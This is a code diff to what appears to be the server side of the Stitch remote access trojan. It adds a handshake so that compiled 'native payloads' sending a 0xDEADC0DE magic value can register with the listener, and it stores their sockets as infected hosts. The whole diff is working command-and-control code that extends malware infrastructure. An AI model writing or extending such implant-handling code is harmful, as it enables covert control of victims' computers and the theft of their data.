@@ -118,6 +118,29 @@ class stitch_server(cmd.Cmd):
             if client_socket:
                 # Use unique IP:Port key to avoid NAT overwrites
                 unique_id = f"{addr[0]}:{addr[1]}"
+                
+                # Handle handshake from native payload
+                # Native payloads send: [magic:4][version:1][challenge:8]
+                # and expect: [magic:4][version:1][challenge_response:8]
+                try:
+                    client_socket.settimeout(2.0)
+                    handshake_data = client_socket.recv(13, socket.MSG_PEEK)
+                    if len(handshake_data) == 13:
+                        # Check if this looks like a native payload handshake
+                        import struct
+                        magic = struct.unpack('!I', handshake_data[:4])[0]
+                        if magic == 0xDEADC0DE:
+                            # This is a native payload - consume and respond to handshake
+                            handshake = client_socket.recv(13)
+                            # Send response: echo back magic, version, and challenge
+                            client_socket.send(handshake)
+                    client_socket.settimeout(None)
+                except:
+                    # If handshake fails, still accept the connection
+                    # (might be Python Stitch payload which doesn't use this handshake)
+                    client_socket.settimeout(None)
+                    pass
+                
                 self.inf_sock[unique_id] = client_socket
                 self.inf_port[unique_id] = addr[1]
                 st_print('[+] New successful connection from {}\n'.format(addr))
